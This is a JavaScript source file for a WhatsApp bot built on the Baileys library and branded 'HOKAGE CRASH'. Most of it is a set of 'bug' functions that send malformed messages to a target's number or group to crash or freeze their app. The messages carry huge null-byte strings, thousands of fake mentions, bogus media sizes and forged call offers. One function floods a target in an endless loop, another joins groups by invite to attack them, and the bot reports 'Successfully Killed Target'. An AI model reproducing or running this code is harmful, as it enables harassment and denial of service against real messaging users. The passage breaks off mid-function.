require("./settings");

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    jidDecode
} = require("@whiskeysockets/baileys");

const axios = require('axios');
const fs = require('fs-extra');
const crypto = require("crypto");
const util = require('util');
const chalk = require('chalk');
const { addPremiumUser, delPremiumUser } = require("./lib/premium");
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const runtime = (seconds) => {
    seconds = Number(seconds);
    const d = Math.floor(seconds / (3600 * 24));
    const h = Math.floor(seconds % (3600 * 24) / 3600);
    const m = Math.floor(seconds % 3600 / 60);
    const s = Math.floor(seconds % 60);
    const dDisplay = d > 0 ? d + 'd ' : '';
    const hDisplay = h > 0 ? h + 'h ' : '';
    const mDisplay = m > 0 ? m + 'm ' : '';
    const sDisplay = s > 0 ? s + 's' : '';
    return dDisplay + hDisplay + mDisplay + sDisplay;
};

function createSticker(hash) {
    return {
        url: `https://mmg.whatsapp.net/v/t62.15575-24/${hash}`,
        fileSha256: hash,
        fileEncSha256: hash,
        mediaKey: hash,
        mimetype: "image/webp",
        directPath: `/v/t62.15575-24/${hash}`,
        fileLength: "10610",
        mediaKeyTimestamp: "1741150286",
    };
}

//===============
module.exports = minato = async (minato, m, chatUpdate, store) => {

try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "messageContextInfo" ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text : "");

const prefix = (typeof body === "string" ? global.prefix.find(p => body.startsWith(p)) : null) || "";  
const isCmd = !!prefix;  
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : []; 
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
const text = args.join(" "); 
const fatkuns = m.quoted || m;
const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
: fatkuns;
//======================
const botNumber = minato.user.id.replace(/:.*/, '');
const sender = m.sender;
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
let premuser = [];
try { premuser = JSON.parse(fs.readFileSync("./system/database/premium.json")); } catch(e) {}
const isPremium = [botNumber, ...global.owner, ...premuser.map(user => user.id.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(m.sender);
if (!minato.public && !isCreator) return;

//======================
const isGroup = m.chat.endsWith("@g.us");
const groupMetadata = isGroup ? await minato.groupMetadata(m.chat).catch(() => ({})) : {};
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const senderbot = m.key.fromMe ? (minato.user.id || '').split(':')[0] + "@s.whatsapp.net" || minato.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
const isBotAdmins = groupAdmins.includes(botNumber);
const isAdmins = groupAdmins.includes(m.sender);
const groupName = groupMetadata.subject || "";
await checkAntiLink(minato, m);
let example = (teks) => {
return `\n\`ᴡʀᴏɴɢ ᴄᴏᴍᴍᴀɴᴅ\` \n *ᴇxᴀᴍᴘʟᴇ ᴏғ ᴜsᴀɢᴇ* :*\nᴛʏᴘᴇ *cmd*${cmd}* ${teks}\n`
}

const jpegThumbnail = fs.readFileSync('./media/thumb.jpg');

const HKQuoted = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net", 
    remoteJid: "status@broadcast",
    id: "HKQuoted"
  },
  message: {
    extendedTextMessage: {
      text: "𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻",
      title: "</> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅",
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title: "</> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅",
          body: "telegram.com",
          mediaType: 1,
          sourceUrl: "https://telegram.com",
          thumbnail: fs.readFileSync(`./media/thumb.jpg`),
          renderLargerThumbnail: false,
          showAdAttribution: false,
        }
      }
    }
  }
};

const from = m.key.remoteJid || "";

const reply = (teks) => minato.sendMessage(m.chat, { text: teks }, { quoted: HKQuoted });

async function doneress () {
  if (!text) throw "Done Response"
  let pepec = args[0].replace(/[^0-9]/g, "")
  let thumbnailUrl = "https://files.catbox.moe/s51p6p.jpg"
  let ressdone = `
╭──────────────❍
│ ─( 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑲𝒊𝒍𝒍𝒆𝒅 𝑻𝒂𝒓𝒈𝒆𝒕 )─
│
│⪼ 𝑇𝑦𝑝𝑒 𝐵𝑢𝑔 : *${command}*
│⪼ 𝑇𝑎𝑟𝑔𝑒𝑡 : *${pepec}*
╰──────────────❍

 𝑷𝒍𝒆𝒂𝒔𝒆 𝑷𝒂𝒖𝒔𝒆 𝟏𝟎 𝑴𝒊𝒏𝒖𝒕𝒆𝒔
` 
  
  minato.sendMessage(m.chat, {
    video: {
      url: 'https://files.catbox.moe/k8cy1u.mp4' 
    },
    caption: ressdone,
    gifPlayback: true,  
    contextInfo: {
      mentionedJid: [m.sender],
      externalAdReply: {
        showAdAttribution: false,
        title: '𝙷𝙾𝙺𝙰𝙶𝙴 𝙲𝚁𝙰𝚂𝙷 𝚅𝟻',
        body: '</> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅',
        thumbnailUrl: 'https://files.catbox.moe/s51p6p.jpg',
        sourceUrl: 'https://whatsapp.com/channel/0029VbAj0uCLikg6Pfjs4i2u',
        mediaType: 2,
        renderLargerThumbnail: false
      },
      forwardedNewsletterMessageInfo: {
        newsletterJid: '120363419855570475@newsletter',
        newsletterName: '</> 𝙻𝙾𝚁𝙳 𝙼𝙸𝙽𝙰𝚃𝙾 𝙳𝙴𝚅',
        serverMessageId: -1
      }
    },
    headerType: 5,
    viewOnce: false
  }, { quoted: HKQuoted });

//=================== ( Console Message ) ===========\\
console.log("┏━━━━━━━━━━━━━━━━━━━━━━━=");
console.log(`┃¤ ${chalk.hex("#FFD700").bold(" MASSAGE")} ${chalk.hex("#00FFFF").bold(`[${new Date().toLocaleTimeString()}]`)} `);
console.log(`┃¤ ${chalk.hex("#FF69B4")("💌 Sender:")} ${chalk.hex("#FFFFFF")(`${m.pushName} (${m.sender})`)} `);
console.log(`┃¤ ${chalk.hex("#FFA500")("📍 In:")} ${chalk.hex("#FFFFFF")(`${groupName || "Private Chat"}`)} `);
console.log(`┃¤ ${chalk.hex("#00FF00")("📝 message :")} ${chalk.hex("#FFFFFF")(`${body || m?.mtype || "Unknown"}`)} `);
console.log("┗━━━━━━━━━━━━━━━━━━━━━━━=")}
//=============(   Bugs functions  ) ======\\
async function xxx(minato, target) {
    
    const msg2 = {
        interactiveMessage: {
            header: {
                title: "Iamsatz",
                },
            body: {},
            footer: {
                text: "satz",
                hasMediaAttachment: true,
      audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mp4",
      fileSha256: "BAcpC1KGx40bu/FV78kBAafPjkkdj6DLVAx+B1g3avQ=",
      fileLength: "109951162777600",
      seconds: 1,
      ptt: true,
      mediaKey: "1KXHR1pvx2+y01K6Dewevx5FF5O5wfc5iE/oHIua2WY=",
      fileEncSha256: "CggqdAt0fX+QHjKnfyX2OjO1OoUXLm5WlVlv6f5aGCU=",
      directPath: "/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1774107510",
      waveform: "EBAREicPEigjMkgwMDITDQ8QFBYkCwwMDAwIBAUCBScpMkNkUE1GTT1KVVk0VUVOWlUtWEk0X0o+Xh4XFxAIAQ==",
      }
    },
            nativeFlowMessage: {
                buttons: [
                    {
  name: "single_select",
  buttonParamsJson: JSON.stringify({
    title: "Iamsatz",
    sections: [
      {
        title: "",
        rows: Array.from({ length: 4 }, (_, i) => ({
          id: "\u0000".repeat(9000),
          title: "\u0000".repeat(10000)
        }))
      }
    ]
  })
},
                    {
  name: "cta_call",
  buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(150000),
                  phone_number: "\u0000".repeat(5000)
                })
}
                    ]
                },
            contextInfo: {
                remoteJid: Math.random().toString(36) + "REQUEST_LOCATION",
                quotedMessage: {
                    conversation: "IamSatz"
                    },
                }
            }
        }
         
        await minato.relayMessage(target,msg2,{
            participant: { jid: target }
            })
}

async function bulldozer(minato, target) {
  let message = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "# ⌁𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐛𝐮𝐠✨",
            hasMediaAttachment: false,
          },
          videoMessage: {
            url: "https://mmg.whatsapp.net/...",
            mimetype: "video/mp4",
            fileSha256: "...",
            fileLength: "1073741824",
            height: 1080,
            width: 1920,
            mediaKey: "...",
            fileEncSha256: "...",
            directPath: "...",
            mediaKeyTimestamp: "1775847446",
            seconds: 3600,
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              mentionedJid: [
                "13157425953@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  "1" +
                  Math.floor(Math.random() * 5000000) +
                  "@s.whatsapp.net"
                ),
              ],
              expiration: 9741,
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 9742,
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING",
              },
            },
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\u0000".repeat(1045900),
            version: 3,
          },
        },
      },
    },
  };

  let msg = generateWAMessageFromContent(target, message, {});

  await minato.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function MarkDelayHardInvis(minato, target) {
  for (let i = 0; i < 5; i++) {
    const message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: { title: "\u0000" + "ꦾ".repeat(8000) },
            body: { text: "\u0000" + "ꦽ".repeat(8000) },
            contextInfo: {
              stanzaId: "ZyX_id",
              isForwarding: true,
              forwardingScore: 999,
              participant: target,

              mentionedJid: [
                "13333335502@s.whatsapp.net",
                ...Array.from({ length: 2000 }, () =>
                  "\u0000" +
                  "1" +
                  Math.floor(Math.random() * 5000000) +
                  "13333335502@s.whatsapp.net"
                ),
              ],

              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimeStamp: Date.now() + 18144000000,
                },
              },

              remoteJid: "status@broadcast",
              tag: "meta",

              forwardedAiBotMessageInfo: {
                botName: "HOKAGE CRASH",
                botJid: Math.floor(Math.random() * 99999),
                creatorName: "ZyX",
              },
            },
          },
        },
      },
    };

    try {
      await minato.relayMessage(target, message, {});
    } catch {}
  }
}

async function ghj(minato, target) {
  while (true) {
    try {   
      const Andros = {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {                     
              body: {
                text: "Maen Yok, Ga sor kah? ",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "cta_url",
                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
                version: 3
              }
            }
          }
        }
      };

      await minato.relayMessage(target, Andros, { 
        participant: { jid: target } 
      });
      
      console.log(`Andros Bugs Succes Send To Numbers ${target}`);

      await new Promise(resolve => setTimeout(resolve, 1500));

    } catch (e) {
      console.log("❌ Error AndroS Bugsss:", e);
      await new Promise(resolve => setTimeout(resolve, 5000));
    }
  }
}

async function SuperBugs(minato, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          header: {
            title: "By EmakLoe Nih" + "{".repeat(90000),
            subtitle: "Enak Ga Todd?"
          },
          body: {
            text: "assalamu'alaikum"
          },
          footer: {
            text: "assalamualaikum"
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true
          },
          nativeFlowMessage: {
            messageParamsJson: "\u0000".repeat(4000),
            buttons: [
              {
                name: "ZyX1",
                buttonParamsJson: JSON.stringify({
                  display_text: "ZyX",
                  flow_cta: "\u0000".repeat(1000),
                  flow_message_version: "3"
                })
              },
              {
                name: "ZyX 2",
                buttonParamsJson: JSON.stringify({
                  display_text: "Makloe",
                  flow_cta: "\u0000".repeat(1000),
                  flow_message_version: "3"
                })
              },
              {
                name: "ZyX 3",
                buttonParamsJson: JSON.stringify({
                  display_text: "Makloe",
                  flow_cta: "\u0000".repeat(1000),
                  flow_message_version: "3"
                })
              }
            ]
          }
        },
        interactiveResponseMessage: {
          header: {
            title: "Aku Sange Nih Mass"
          },
          body: {
            text: "ZyX Anti Ampas"
          },
          nativeFlowResponseMessage: {
            responseParamsJson: "\u0000".repeat(9000)
          }
        }
      }
    }
  };

  await minato.relayMessage(target, msg, {});
}

async function LoseBuldo(minato, target) {
  for (let i = 0; i < 1000; i++) {
    try {
      let sejaya = {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            stanzaId: minato.generateMessageTag ? minato.generateMessageTag() : Date.now().toString(),
            participant: "0@s.whatsapp.net",
            remoteJid: "696969696969@s.whatsapp.net",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 40000 }, 
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
            fromMe: false,
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            remoteJid2: "status@broadcast",
            mentionedJid2: [
              "0@s.whatsapp.net",
              "13135550002@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
              ),
            ],
            ephemeralSettingTimestamp: 9741,
            entryPointConversionSource2: "WhatsApp.com",
            entryPointConversionApp2: "WhatsApp",
            disappearingMode: {
              initiator: "INITIATED_BY_OTHER",
              trigger: "ACCOUNT_SETTING",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
              ],
              messageParamsJson: "{{".repeat(15000),
            },
          },
        },
      };

      await minato.relayMessage(target, sejaya, {
        messageId: minato.generateMessageTag ? minato.generateMessageTag() : (Date.now() + i).toString()
      });
      
      console.log("Buldozzer " + (i + 1));
     
      await new Promise(resolve => setTimeout(resolve, 100));
    } catch (error) {
      console.error("Error pada iterasi ke-" + i + ":", error.message);
      break; 
    }
  }
}

async function MakluGwEvve(minato, target) {
  const Ridzz = {
    groupStatusMessageV2: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
          fileLength: "10610",
          mediaKeyTimestamp: "1775044724",
          stickerSentTs: "1775044724091", 
          isAvatar: false,
          isAiSticker: false,
          isLottie: null,
          contextInfo: {
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            urlTrackingMap: {
              urlTrackingMapElements: Array.from(
                { length: 500000 },
                () => ({ "\0": "\0" })
              )
            }
          }
        }
      }
    }
  }

  return await minato.relayMessage("status@broadcast", Ridzz, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: { status_setting: "contacts" },
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: []
              }
            ]
          }
        ]
      }
    ]
  });
}

async function proccesCrashGroup(minato, inviteCode) {
    try {
        let group = await minato.groupAcceptInvite(inviteCode);
        let target = group;
        
        for (let i = 0; i < 50; i++) {
            try {
                await xxx(minato, target);
                await sleep(2000);
                await SuperBugs(minato, target);
                await sleep(2000);
            } catch (e) {
                console.log("Group crash loop error:", e);
            }
        }
    } catch (err) {
        console.error("Group crash error:", err);
    }
}

async function Whatsapps(minato, target) {
 const {
    encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");
    
let devices = (
await minato.getUSyncDevices([target], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

await minato.assertSessions(devices)

let privt = () => {
let map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => {
try { await prev; } catch {}
return fn();
})(map[key].task);
return map[key].task;
}
};
};

let vion = privt();
let vionv1 = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let Official = minato.createParticipantNodes.bind(minato);
let vionoc = minato.encodeWAMessage?.bind(minato);

minato.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (minato.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let memeg = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = minato.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(memeg.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = vionv1(vionoc ? vionoc(msg) : encodeWAMessage(msg));

return vion.mutex(jid, async () => {
let { type, ciphertext } = await minato.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let Exo = crypto.randomBytes(32);
let Floods = Buffer.concat([Exo, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await minato.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

let vionlast = {
tag: "call",
attrs: { to: target, id: minato.generateMessageTag(), from: minato.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": minato.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{
tag: "video",
attrs: {
orientation: "0",
screen_width: "1920",
screen_height: "1080",
device_orientation: "0",
enc: "vp8",
dec: "vp8"
}
},
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(minato.authState.creds.account, true)
}] : [])
]
}]
};
await minato.sendNode(vionlast);

const andros = {
       interactiveMessage: {
           message: {
             stickerMessage: {
                 url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                 fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                 fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                 mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                 mimetype: "image/webp",
                 directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                 fileLength: "10610",
                 mediaKeyTimestamp: "1775044724",
                 stickerSentTs: "1775044724091"
                }
            }
        }
    };

  await minato.relayMessage(target, andros, {
    participant: { jid: target },
    messageId: null,
    userJid: target,
    quoted: null
  });
}

async function ziperrsedot(minato, target, mention) {
  let MakLo = true;
  if (11 > 9) {
    MakLo = MakLo ? false : true;
  }
  
  const NanMsg1 = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0&mms3=true",
            fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
            fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
            mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
            mimetype: "image/webp",
            directPath:
              "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
            fileLength: {
              low: Math.floor(Math.random() * 1000),
              high: 0,
              unsigned: true,
            },
            mediaKeyTimestamp: {
              low: Math.floor(Math.random() * 500000000),
              high: 0,
              unsigned: false,
            },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 1999 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 900000) +
                    "@s.whatsapp.net"
                ),
              ],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionsleepSeconds: 467593,
            },
            stickerSentTs: {
              low: Math.floor(Math.random() * -50000000),
              high: 1000,
              unsigned: MakLo,
            },
            isAvatar: MakLo,
            isAiSticker: MakLo,
            isLottie: MakLo,
          },
        },
      },
    },
    {}
  );
  
let NanMsg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "(🌷) ziper Not Dev?",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 500000000),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "9"),
    });

  await minato.relayMessage("status@broadcast", NanMsg1.message, {
    messageId: NanMsg1.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  await minato.relayMessage("status@broadcast", NanMsg2.message, {
    messageId: NanMsg2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await minato.relayMessage(
      target,
      {
    statusMentionMessage: {
        message: {
           protocolMessage: {
              key: NanMsg2.key,
              participant: "131355550002@s.whatsapp.net",
              remoteJid: target,
              type: 25,
            },
            additionalNodes: [
              {
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined,
              },
            ],
          },
        },
      },
      {}
    );
  }
}

async function CV14(minato, target) {
  for (let i = 0; i < 2; i++) {
    await minato.relayMessage(target, {
    viewOnceMessage: {
    message: {
      interactiveMessage: {
        body: { text: "i'm... Not Perfect..." + "ꦾ".repeat(61000) },
        footer: { text: "ោ៝".repeat(7000) },
        header: {
          hasMediaAttachment: true,
          imageMessage: {
            url: 'https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true',
            mimetype: 'image/jpeg',
            fileSha256: 'dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=',
            fileLength: '99999999991',
            height: -111,
            width: 111,
            mediaKey: 'LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=',
            fileEncSha256: 'G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=',
            directPath: '/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0',
            mediaKeyTimestamp: '1721344123',
            jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z',
            scansSidecar: 'igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==',
            scanLengths: [247, 201, 73, 63],
            midQualityFileSha256: 'qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro='
          }
        },
        nativeFlowMessage: {
          messageParamsJson: "{",
